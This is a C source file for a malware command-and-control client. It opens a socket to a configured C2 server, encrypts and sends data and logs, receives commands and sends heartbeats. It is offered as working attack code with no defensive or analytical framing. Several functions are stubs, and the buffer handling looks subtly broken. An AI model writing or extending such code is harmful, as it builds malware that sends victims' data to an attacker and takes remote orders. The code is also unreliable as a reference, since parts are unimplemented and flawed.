#include "c2_communication_fixed.h"

static int c2_socket = -1;
static int c2_connected = 0;

int c2_init(void) {
    if (c2_connected) {
        return 0;
    }

    // Create socket
    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_socket < 0) {
        perror("Failed to create socket");
        return -1;
    }

    // Connect to C2 server
    if (c2_connect() != 0) {
        close(c2_socket);
        c2_socket = -1;
        return -1;
    }

    c2_connected = 1;
    return 0;
}

void c2_cleanup(void) {
    if (!c2_connected) {
        return;
    }

    // Disconnect from C2 server
    c2_disconnect();

    // Close socket
    close(c2_socket);
    c2_socket = -1;
    c2_connected = 0;
}

int c2_send_data(const char *data, size_t size) {
    if (!c2_connected) {
        fprintf(stderr, "Not connected to C2 server\n");
        return -1;
    }

    // Encrypt data before sending
    char encrypted_data[size * 2];
    encrypt_traffic(data, size, encrypted_data);

    // Send data
    ssize_t bytes_sent = send(c2_socket, encrypted_data, size * 2, 0);
    if (bytes_sent < 0) {
        perror("Failed to send data");
        return -1;
    }

    return bytes_sent;
}

int c2_receive_data(char *buffer, size_t buffer_size) {
    if (!c2_connected) {
        fprintf(stderr, "Not connected to C2 server\n");
        return -1;
    }

    // Receive data
    ssize_t bytes_received = recv(c2_socket, buffer, buffer_size - 1, 0);
    if (bytes_received < 0) {
        perror("Failed to receive data");
        return -1;
    }

    // Decrypt data
    char decrypted_data[buffer_size];
    decrypt_traffic(buffer, bytes_received, decrypted_data);
    memcpy(buffer, decrypted_data, bytes_received);
    buffer[bytes_received] = '\0';

    return bytes_received;
}

int c2_send_logs(const char *log_data, size_t log_size) {
    // Implementation would go here
    return c2_send_data(log_data, log_size);
}

int c2_receive_command(char *buffer, size_t buffer_size) {
    // Implementation would go here
    return c2_receive_data(buffer, buffer_size);
}

int c2_connect(void) {
    struct hostent *server = gethostbyname(C2_SERVER);
    if (server == NULL) {
        fprintf(stderr, "Failed to resolve C2 server: %s\n", C2_SERVER);
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    server_addr.sin_port = htons(C2_PORT);

    // Connect to server
    if (connect(c2_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to connect to C2 server");
        return -1;
    }

    return 0;
}

void c2_disconnect(void) {
    if (c2_connected) {
        shutdown(c2_socket, SHUT_RDWR);
        c2_connected = 0;
    }
}

int c2_is_connected(void) {
    return c2_connected;
}

void c2_heartbeat(void) {
    if (c2_connected) {
        const char *heartbeat = "HEARTBEAT\n";
        c2_send_data(heartbeat, strlen(heartbeat));
    }
}

int c2_check_server_status(void) {
    // Implementation would go here
    return c2_connected ? 0 : -1;
}